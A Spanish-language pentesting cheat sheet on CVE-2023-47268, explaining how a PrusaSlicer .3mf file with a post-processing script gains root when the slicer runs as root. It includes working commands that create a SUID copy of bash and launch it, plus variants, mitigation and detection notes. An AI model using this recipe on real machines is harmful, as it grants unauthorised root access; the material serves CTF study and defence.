---
topic: PrusaSlicer — scripts de post-procesado como root
tags: [linux, prusaslicer, 3mf, cve-2023-47268, privesc]
---

# PrusaSlicer — scripts de post-procesado como root

[🌐 English](prusaslicer-post-processing.en.md) | **Español**

## Concepto

Un archivo `.3mf` puede incluir un script de post-procesado. Si PrusaSlicer se ejecuta como root y procesa el modelo, el script se ejecuta con esos privilegios. CVE-2023-47268 describe esta ejecución arbitraria.

## Cuándo aplica

- El usuario puede ejecutar PrusaSlicer como root.
- Se puede proporcionar o modificar un `.3mf`.
- El modo experto permite scripts de post-procesado.

## Procedimiento

1. Copiar el `.3mf` y abrirlo en modo experto.
2. Añadir un script que copie `/bin/bash` y le dé SUID.
3. Ejecutar PrusaSlicer como root con `-s`.
4. Lanzar la shell SUID.

## Comandos

```bash
cp /bin/bash /tmp/rootbash; chmod 6777 /tmp/rootbash
prusaslicer -s malicious.3mf
/tmp/rootbash -p
```

## Variantes

- Script en `print_host` o `post_processing`.
- Añadir el script a un perfil existente.
- Combinar con un archivo de proyecto compartido.

## Limitaciones

- El `.3mf` debe ser aceptado por la versión.
- La ejecución como root es necessaria para escalar.
- El script puede requerir una ruta absoluta.

## Mitigación

- No ejecutar PrusaSlicer como root.
- Deshabilitar scripts de post-procesado.
- Tratar los `.3mf` como archivos no confiables.

## Detección

- PrusaSlicer ejecutado como root.
- Shells SUID creadas tras un slicing.
- Scripts en `.3mf` con rutas sospechosas.

## Referencias

- [NVD — CVE-2023-47268](https://nvd.nist.gov/vuln/detail/CVE-2023-47268)
- [0xdf — Trickster](https://0xdf.gitlab.io/2025/02/01/htb-trickster.html)
- [PrusaSlicer — post-processing](https://help.prusa3d.com/article/post-processing-scripts_283913)
